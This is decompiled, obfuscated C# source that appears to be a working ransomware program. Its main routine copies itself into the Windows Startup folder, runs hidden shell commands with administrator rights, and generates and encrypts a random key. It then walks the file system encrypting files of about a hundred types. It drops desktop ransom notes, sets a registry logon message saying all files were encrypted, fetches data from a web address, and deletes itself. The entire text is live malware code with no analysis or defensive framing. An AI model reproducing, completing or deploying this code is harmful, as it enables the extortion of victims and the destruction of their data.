	public static string FlfcMNWtWJT;

	public static string hICvTAbwOH;

	public static string qiAyCZrkcfxPCy;

	public static string oHvnHZNAsYHPnYh;

	public static string PlWUGyhfSqfH;

	public static string nEPaoSCDDJIu;

	public static string XhJHLJrVZaJK;

	public static string QNfiyxlqnyQSHfAtq;

	public static string QTMFjMGUSzJtndnPr;

	public static string ynsSldAgNPTL;

	public static string bmLbSmUKQBkE;

	public static string AzCwVUHADRyQl;

	public static string XKThLpoClXsvWc;

	public static string DalbLBzSpkO;

	public static string nHbzLHWNkTpdce;

	public static string tPCQnXbcSTT;

	public static string tvydoMeQddnwLfE;

	public static string MjNpYfbjnEDi;

	public static string UPPaZPQieUNgnnu;

	public static string[] VaGiOwbIOhAwriX;

	public static string RkUaESiNCKRAc;

	public static bool gzeLuZIeGEn;

	public static string deIFjWqTxmS;

	public static bool pWVZjGlhSAv;

	public static bool epoMZiCIvzDw;

	public static bool yFqzKQIYBVit;

	public static bool grHEUQDDHItFXk;

	public static string EMMziOGItwvgBn;

	public static bool wnBkEuneoGOR;

	public static bool TbDfMwWVTbJO;

	public static bool GAIvQZMakR;

	public static bool UKtytEenHZq;

	public static bool rTfnyAYcMHFOLjucY;

	public static string xWkyqHPGgTDUWV;

	public static bool HWttnJXULiJ;

	public static Stopwatch wwZjPqxjlvFwy;

	public static int OGYcpcFLVvGwO;

	public static int GkQZQPTFEnIO;

	public static bool PqrzhfLlmsnd;

	public static string mpATdrWCpkge;

	public static string[] ovnWSoWGUtwXV;

	public static List<string> CyGCgzMZZuAJtJpyo;

	public static int nGueWKGoROlbJ;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && UyIztOAKEezWP == getString_0(107396728))
		{
			try
			{
				dcvCYFKqouCzE CS_0024_003C_003E8__locals0 = new dcvCYFKqouCzE();
				CS_0024_003C_003E8__locals0.IhwCWVllYwuB = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.IhwCWVllYwuB) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && UyIztOAKEezWP == getString_0(107396728))
		{
			try
			{
				tUAycXpQytRG.iHPpzmPygvM(PMRQITQObEzp);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (tPCQnXbcSTT == getString_0(107396723))
			{
				Thread thread = new Thread(BkbxdgWdONb.NODfkncHvfCgY);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (MpmgvBYaLaSbnY == getString_0(107396723))
		{
			Thread.Sleep(int.Parse(IeKwaPTezjkQDpKG));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NdkBdhvmkUBFR == getString_0(107396723))
		{
			try
			{
				UsaNOiLDXrs(fZQJZGRivPka(getString_0(107396750)));
			}
			catch
			{
			}
		}
		try
		{
			if (uYovVkzDWye == getString_0(107396723) && uGmaULIGNdDeMiC.btuWddwPmLfP())
			{
				new jVzvlUDeCcikx().hGJuAchpXUEh(bool_0: false);
				uGmaULIGNdDeMiC.LSlUvCeFLr();
			}
		}
		catch (Exception)
		{
		}
		if (kEHvKLBwHtuY == getString_0(107396723) && uGmaULIGNdDeMiC.btuWddwPmLfP())
		{
			new jVzvlUDeCcikx().hGJuAchpXUEh(bool_0: false);
			new jVzvlUDeCcikx().JlFVUEIeNUAnaBe();
		}
		if (kYYskRZASkhQ == getString_0(107396723))
		{
			CefXHTTfJuC.wSFnQgprrqwz();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397157);
			string text2 = text + Path.GetFileName(fileName);
			if (IjDiPwITXKF == getString_0(107396723) && fileName != text2)
			{
				Thread thread2 = new Thread(TkFphDbFrl);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (fMeVGYfZEqWIT == getString_0(107396723) && mainModule != null && fileName != text2)
			{
				try
				{
					UfSUSXJgOcwOs = ipsSMGmYOTSDpu(0, bvUZAsIAmqXqC.Count);
					File.Copy(fileName, text + bvUZAsIAmqXqC[UfSUSXJgOcwOs], overwrite: true);
					Process.Start(text + bvUZAsIAmqXqC[UfSUSXJgOcwOs]);
					jdmoOyvaEbtumBA();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (IvhuCXWwZumGPb == getString_0(107396723) && DateTime.Now < SuSdzNJyyA)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (hmHVGpHMkL == getString_0(107396723) && DateTime.Now > tBAHkTTjaqbd)
			{
				jdmoOyvaEbtumBA();
			}
		}
		catch
		{
		}
		ldwJWDFPIOUSKD();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> rYQEJChRDfRniT = RYQEJChRDfRniT;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						XODaKIXwEBpBTdl(getString_0(107389640), string_0);
					};
				}
				Parallel.ForEach(rYQEJChRDfRniT, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> jFmJYDYJbJqWkNVD = JFmJYDYJbJqWkNVD;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						XODaKIXwEBpBTdl(getString_0(107391165), string_0);
					};
				}
				Parallel.ForEach(jFmJYDYJbJqWkNVD, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> iYyHyFnceXw = IYyHyFnceXw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107389631)), string_0);
					};
				}
				Parallel.ForEach(iYyHyFnceXw, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (UPPaZPQieUNgnnu == getString_0(107396723))
				{
					string[] vaGiOwbIOhAwriX = VaGiOwbIOhAwriX;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107389631)), getString_0(107389606) + string_0 + getString_0(107389565));
						};
					}
					Parallel.ForEach(vaGiOwbIOhAwriX, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!ixxpmNQdpls().Contains(getString_0(107389788)))
				{
					ZSlmfteQVnXjJY(rtAqVHFswBwj);
				}
				else
				{
					List<string> source = mHHmssBZBWOZ;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							XODaKIXwEBpBTdl(fZQJZGRivPka(CiGbFuBASDry(getString_0(107389560))), string_0);
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> bmlqsqzWSp = BmlqsqzWSp;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107389567)), string_0);
					};
				}
				Parallel.ForEach(bmlqsqzWSp, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> source2 = phIVwPSoCuYf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						XODaKIXwEBpBTdl(getString_0(107390062), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && yFqzKQIYBVit)
			{
				try
				{
					Thread thread4 = new Thread(EQdJghfEDGBOx.UQdYYSmbzjgKnaO);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			XODaKIXwEBpBTdl(getString_0(107397152), fZQJZGRivPka(getString_0(107397107)));
			XODaKIXwEBpBTdl(getString_0(107397152), fZQJZGRivPka(getString_0(107397066)));
			XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107396977)), fZQJZGRivPka(getString_0(107396996)));
			XODaKIXwEBpBTdl(fZQJZGRivPka(getString_0(107396977)), fZQJZGRivPka(getString_0(107396354)));
		}
		SecureString secureString = new SecureString();
		if (ciHqTVbhEVV == getString_0(107396728))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			IauEKWzaXvhA = getString_0(107396692);
		}
		LSRZdRUSOM = cNhkWTsTMsDed.VZcAhXOlbGZB(VKvwGhzwkCne(secureString));
		if (PHCDdlXNXITu == getString_0(107396723))
		{
			wTcFSLxQnc();
		}
		if (GAIvQZMakR)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), xWkyqHPGgTDUWV)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), xWkyqHPGgTDUWV), string.Concat(fZQJZGRivPka(getString_0(107396679)), new WebClient().DownloadString(fZQJZGRivPka(getString_0(107396654))), getString_0(107396613), fZQJZGRivPka(getString_0(107396608)), DateTime.Now, getString_0(107396613), fZQJZGRivPka(getString_0(107396535)), LSRZdRUSOM));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), xWkyqHPGgTDUWV), getString_0(107396478) + LSRZdRUSOM);
				}
			}
			catch (Exception ex7)
			{
				if (wnBkEuneoGOR)
				{
					try
					{
						File.AppendAllText(EMMziOGItwvgBn, getString_0(107396481) + ex7.Message + getString_0(107396613));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		hhaEdmOlzJdiPP.OOffzqvMrmeMoD(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ynsSldAgNPTL), nQuRbgQYAnumG(LSRZdRUSOM), null, null, getString_0(107395888), getString_0(107395903), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			AajSxfwPbabHmrH();
		}
		try
		{
			hCEeTXMscBWAu(new string[1] { getString_0(107395886) }, new string[100]
			{
				getString_0(107395877),
				getString_0(107395872),
				getString_0(107395835),
				getString_0(107395826),
				getString_0(107395853),
				getString_0(107395848),
				getString_0(107395843),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395796),
				getString_0(107395791),
				getString_0(107395818),
				getString_0(107395809),
				getString_0(107395772),
				getString_0(107395763),
				getString_0(107395790),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395775),
				getString_0(107395738),
				getString_0(107395729),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395709),
				getString_0(107395704),
				getString_0(107395699),
				getString_0(107395726),
				getString_0(107395721),
				getString_0(107395716),
				getString_0(107395711),
				getString_0(107396186),
				getString_0(107396181),
				getString_0(107396176),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107395843),
				getString_0(107396147),
				getString_0(107395801),
				getString_0(107396170),
				getString_0(107396165),
				getString_0(107396160),
				getString_0(107396123),
				getString_0(107396118),
				getString_0(107396113),
				getString_0(107396140),
				getString_0(107396135),
				getString_0(107396130),
				getString_0(107396093),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396110),
				getString_0(107396105),
				getString_0(107396100),
				getString_0(107396095),
				getString_0(107396058),
				getString_0(107396049),
				getString_0(107396076),
				getString_0(107396067),
				getString_0(107396022),
				getString_0(107396147),
				getString_0(107396041),
				getString_0(107396032),
				getString_0(107395991),
				getString_0(107396014),
				getString_0(107396005),
				getString_0(107395964),
				getString_0(107395959),
				getString_0(107395982),
				getString_0(107395973),
				getString_0(107395420),
				getString_0(107395415),
				getString_0(107395410),
				getString_0(107395437),
				getString_0(107395432),
				getString_0(107395427),
				getString_0(107395390),
				getString_0(107395381),
				getString_0(107395376),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395393),
				getString_0(107395356),
				getString_0(107395347),
				getString_0(107395370),
				getString_0(107395365),
				getString_0(107396181),
				getString_0(107395360),
				getString_0(107395323),
				getString_0(107395318),
				getString_0(107395313),
				getString_0(107395340),
				getString_0(107395331),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395280),
				getString_0(107395307),
				getString_0(107395302)
			}, new string[0], VKvwGhzwkCne(secureString), getString_0(107395297));
		}
		catch (Exception ex9)
		{
			if (wnBkEuneoGOR)
			{
				try
				{
					File.AppendAllText(EMMziOGItwvgBn, getString_0(107395220) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195));
				streamWriter.WriteLine(fZQJZGRivPka(getString_0(107395674)));
				streamWriter.WriteLine(getString_0(107396613));
				streamWriter.WriteLine(fZQJZGRivPka(getString_0(107393136)));
				streamWriter.WriteLine(LSRZdRUSOM);
				if (eiVEOVqJMVupoZG == getString_0(107396728))
				{
					streamWriter.WriteLine(getString_0(107396613));
					streamWriter.WriteLine(fZQJZGRivPka(getString_0(107393615)) + Convert.ToString(JySLVGbqxfI.Count));
				}
				if (PqrzhfLlmsnd)
				{
					streamWriter.WriteLine(getString_0(107396613));
					streamWriter.WriteLine(fZQJZGRivPka(getString_0(107393570)));
					streamWriter.WriteLine(IoVTZTUGdmDX.lOkUlDnVqGkweRha());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195));
				if (!text3.Contains(LSRZdRUSOM) && !pWVZjGlhSAv)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195), getString_0(107393537) + LSRZdRUSOM);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in kFvYdcQcXMKvbXYVW)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395195)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195), item + getString_0(107395195), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195));
					if (!text4.Contains(LSRZdRUSOM) && !pWVZjGlhSAv)
					{
						File.AppendAllText(item + getString_0(107395195), getString_0(107393537) + LSRZdRUSOM);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!grHEUQDDHItFXk && num > 10)
			{
				break;
			}
		}
		if (XKThLpoClXsvWc == getString_0(107396723))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393508)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393508));
					streamWriter2.WriteLine(fZQJZGRivPka(getString_0(107393475)));
					streamWriter2.WriteLine(getString_0(107396613));
					streamWriter2.WriteLine(fZQJZGRivPka(getString_0(107393426)));
					streamWriter2.WriteLine(LSRZdRUSOM + fZQJZGRivPka(getString_0(107392825)));
					if (eiVEOVqJMVupoZG == getString_0(107396728))
					{
						streamWriter2.WriteLine(getString_0(107396613));
						streamWriter2.WriteLine(fZQJZGRivPka(getString_0(107392844)) + fZQJZGRivPka(getString_0(107393615)) + Convert.ToString(JySLVGbqxfI.Count) + fZQJZGRivPka(getString_0(107392825)));
					}
					if (PqrzhfLlmsnd)
					{
						streamWriter2.WriteLine(getString_0(107396613));
						streamWriter2.WriteLine(fZQJZGRivPka(getString_0(107393570)));
						streamWriter2.WriteLine(IoVTZTUGdmDX.lOkUlDnVqGkweRha());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195));
					if (!text5.Contains(LSRZdRUSOM) && !pWVZjGlhSAv)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393508), fZQJZGRivPka(getString_0(107392844)) + getString_0(107393537) + LSRZdRUSOM + fZQJZGRivPka(getString_0(107392825)));
					}
				}
			}
			catch
			{
			}
		}
		if (kORPBzBdjy == getString_0(107396723))
		{
			try
			{
				if (eiVEOVqJMVupoZG == getString_0(107396728))
				{
					IoVTZTUGdmDX.SylkEqngRAyQdU(getString_0(107392751), getString_0(107392778), getString_0(107392733), string.Concat(fZQJZGRivPka(getString_0(107396679)), new WebClient().DownloadString(fZQJZGRivPka(getString_0(107396654))), getString_0(107392724), fZQJZGRivPka(getString_0(107396608)), DateTime.Now, getString_0(107396613), fZQJZGRivPka(getString_0(107392719)), Convert.ToString(JySLVGbqxfI.Count), getString_0(107396613), fZQJZGRivPka(getString_0(107396535)), LSRZdRUSOM));
				}
				else
				{
					IoVTZTUGdmDX.SylkEqngRAyQdU(getString_0(107392751), getString_0(107392778), getString_0(107392733), string.Concat(fZQJZGRivPka(getString_0(107396679)), new WebClient().DownloadString(fZQJZGRivPka(getString_0(107396654))), getString_0(107392724), fZQJZGRivPka(getString_0(107396608)), DateTime.Now, getString_0(107396613), fZQJZGRivPka(getString_0(107392719)), Convert.ToString(JySLVGbqxfI.Count), getString_0(107396613), fZQJZGRivPka(getString_0(107396535)), LSRZdRUSOM));
				}
			}
			catch
			{
			}
		}
		if (xCBKmZUalU == getString_0(107396723))
		{
			try
			{
				UvydSvqXmbs.PTWspTHgawH(new Uri(getString_0(107392670)));
			}
			catch
			{
			}
		}
		if (XKThLpoClXsvWc == getString_0(107396728))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195)))
				{
					Process.Start(fZQJZGRivPka(getString_0(107392669)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395195));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393508)))
				{
					Process.Start(fZQJZGRivPka(getString_0(107392676)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393508));
				}
			}
			catch
			{
			}
		}
		if (PHCDdlXNXITu == getString_0(107396723))
		{
			if (XnbJtBigjAr == getString_0(107396723) && !string.IsNullOrEmpty(cIwOYeNPGIS) && !string.IsNullOrEmpty(FlfcMNWtWJT))
			{
				OKRqGMGpVElkRT(cIwOYeNPGIS, FlfcMNWtWJT);
			}
			else
			{
				OKRqGMGpVElkRT(getString_0(107392627), getString_0(107393110));
			}
		}
		if (XhJHLJrVZaJK != getString_0(107392908))
		{
			hlUeyfOzNlbe(XhJHLJrVZaJK);
		}
		if (!string.IsNullOrEmpty(MsZHKpPUIB))
		{
			try
			{
				File.Delete(MsZHKpPUIB);
			}
			catch
			{
			}
		}
		if (wnBkEuneoGOR)
		{
			try
			{
				File.AppendAllText(EMMziOGItwvgBn, getString_0(107392347));
			}
			catch (Exception)
			{
			}
		}
		if (jYtPzkyZAIWyuO == getString_0(107392366))
		{
			jdmoOyvaEbtumBA();
		}
	}

	public static void TkFphDbFrl()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(fZQJZGRivPka(getString_0(107392357)), fZQJZGRivPka(getString_0(107392203)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int ipsSMGmYOTSDpu(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> VHHlyXLqZsDmVXX(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107392154)) && !text.Contains(getString_0(107392161)) && !text.Contains(getString_0(107392128)) && !text.ToLower().Contains(getString_0(107392591)) && !text.ToLower().Contains(getString_0(107392610)) && !text.Contains(getString_0(107392585)) && !text.Contains(getString_0(107392532)) && !text.ToLower().Contains(getString_0(107392547)) && !text.ToLower().Contains(getString_0(107392502)) && !text.ToLower().Contains(getString_0(107392465)) && !text.ToLower().Contains(getString_0(107392488)) && !text.ToLower().Contains(getString_0(107392439)) && !text.ToLower().Contains(getString_0(107392458)) && !text.ToLower().Contains(getString_0(107392413)) && !text.ToLower().Contains(getString_0(107392424)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392367)) && !fileInfo.FullName.Contains(getString_0(107391838)) && !fileInfo.FullName.Contains(getString_0(107391853)) && !fileInfo.FullName.Contains(getString_0(107391804)) && !fileInfo.FullName.Contains(getString_0(107391819)) && !fileInfo.FullName.Contains(getString_0(107391770)) && !fileInfo.FullName.Contains(getString_0(107391785)) && !fileInfo.FullName.Contains(getString_0(107391736)) && !fileInfo.FullName.Contains(getString_0(107391755)) && !fileInfo.FullName.Contains(getString_0(107391702)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391721)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391676)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391691)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391642)) && !fileInfo.FullName.Contains(fZQJZGRivPka(getString_0(107391657))) && !fileInfo.FullName.Contains(getString_0(107391600)) && !fileInfo.FullName.Contains(getString_0(107391619)) && !fileInfo.FullName.Contains(getString_0(107392082)) && !fileInfo.FullName.EndsWith(getString_0(107395297)) && !fileInfo.FullName.EndsWith(getString_0(107392057)) && !fileInfo.FullName.EndsWith(getString_0(107392052)) && !fileInfo.FullName.EndsWith(getString_0(107392047)) && !fileInfo.FullName.EndsWith(getString_0(107392074)) && !fileInfo.FullName.Contains(getString_0(107392069)) && !fileInfo.FullName.Contains(ynsSldAgNPTL) && !fileInfo.FullName.Contains(EMMziOGItwvgBn) && !fileInfo.FullName.Contains(xWkyqHPGgTDUWV))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(hGmvNAyfRthpRJG) * 1024.0 * 1024.0 && oshynewGZYF == getString_0(107396723))
						{
							list.Add(fileInfo.FullName);
							BxofePwFWXF(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && oshynewGZYF == getString_0(107396728))
						{
							list.Add(fileInfo.FullName);
							BxofePwFWXF(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string XODaKIXwEBpBTdl(string CclUqPnSgZtVEoiR = "", string lkbAyUKtMuOeL = "")
	{
		string result = getString_0(107392670);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CclUqPnSgZtVEoiR,
				Arguments = lkbAyUKtMuOeL,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void UsaNOiLDXrs(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392020),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string CiGbFuBASDry(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string fZQJZGRivPka(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void uUMItiKbcnKYS(string mceJZHxxjNnLedkt = "", string GlZjhjxbyrc = "SW5mb3JtYXRpb24uLi4=", string ZHqAldpqxRoXTa = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		mceJZHxxjNnLedkt = CiGbFuBASDry(getString_0(107392035));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(fZQJZGRivPka(mceJZHxxjNnLedkt), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(fZQJZGRivPka(getString_0(107391938)), fZQJZGRivPka(GlZjhjxbyrc));
				registryKey.SetValue(fZQJZGRivPka(getString_0(107391905)), fZQJZGRivPka(ZHqAldpqxRoXTa));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			mceJZHxxjNnLedkt = CiGbFuBASDry(getString_0(107391876));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(fZQJZGRivPka(mceJZHxxjNnLedkt), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(fZQJZGRivPka(getString_0(107391227)), fZQJZGRivPka(GlZjhjxbyrc));
				registryKey.SetValue(fZQJZGRivPka(getString_0(107391194)), fZQJZGRivPka(ZHqAldpqxRoXTa));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void wTcFSLxQnc()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (XnbJtBigjAr == getString_0(107396723) && !string.IsNullOrEmpty(cIwOYeNPGIS) && !string.IsNullOrEmpty(FlfcMNWtWJT))
				{
					uUMItiKbcnKYS(getString_0(107392670), cIwOYeNPGIS, FlfcMNWtWJT);
				}
				else
				{
					uUMItiKbcnKYS(getString_0(107392670), getString_0(107392627), getString_0(107393110));
				}
			}
		}
		catch
		{
		}
	}

	public static void OKRqGMGpVElkRT(string uGEJDiVtiUmmKMu = "SW5mb3JtYXRpb24uLi4=", string FOOkNCVQDLpeR = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(fZQJZGRivPka(uGEJDiVtiUmmKMu));
		val.set_BalloonTipText(fZQJZGRivPka(FOOkNCVQDLpeR));
		val.ShowBalloonTip(30000);
	}

	public static void hlUeyfOzNlbe(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
